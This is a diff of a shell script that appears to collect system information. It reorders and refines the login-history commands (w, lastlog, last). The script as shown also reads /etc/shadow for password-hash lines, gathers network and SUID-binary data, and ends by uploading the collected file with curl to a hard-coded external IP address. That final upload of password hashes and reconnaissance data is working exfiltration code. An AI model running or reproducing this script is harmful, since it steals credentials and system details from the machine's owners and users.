@@ -13,9 +13,22 @@ CMD="ifconfig -a"
 eval $CMD >> $NAME
 echo "----" >> $NAME
 
+CMD="w"
+eval $CMD >> $NAME
+echo "----" >> $NAME
+
+CMD="lastlog | grep -v Never"
+eval $CMD >> $NAME
+echo "Total: `eval $CMD | wc -l`" >> $NAME
+echo "----" >> $NAME
+
 CMD="cat /etc/shadow | grep '\\$'"
 eval $CMD >> $NAME
 echo "Total: `eval $CMD | wc -l`" >> $NAME
+echo "----" >> $NAME
+
+CMD="last"
+eval $CMD >> $NAME
 echo "----" >> $NAME
 
 CMD="netstat -anpt | grep -v SYN | grep -v ACK | grep -v WAIT | grep -v Internet | grep -v Proto | awk '{print \$7}' | cut -d '/' -f 2 | sort -u"
@@ -45,18 +58,6 @@ echo "----" >> $NAME
 CMD="find / -perm /4000"
 eval $CMD >> $NAME
 echo "Total: `eval $CMD | wc -l`" >> $NAME
-echo "----" >> $NAME
-
-CMD="w"
-eval $CMD >> $NAME
-echo "----" >> $NAME
-
-CMD="lastlog"
-eval $CMD >> $NAME
-echo "----" >> $NAME
-
-CMD="last"
-eval $CMD >> $NAME
 echo "----" >> $NAME
 
 CMD="curl -F 'my_file=@$NAME' http://18.166.106.254/upload.php"
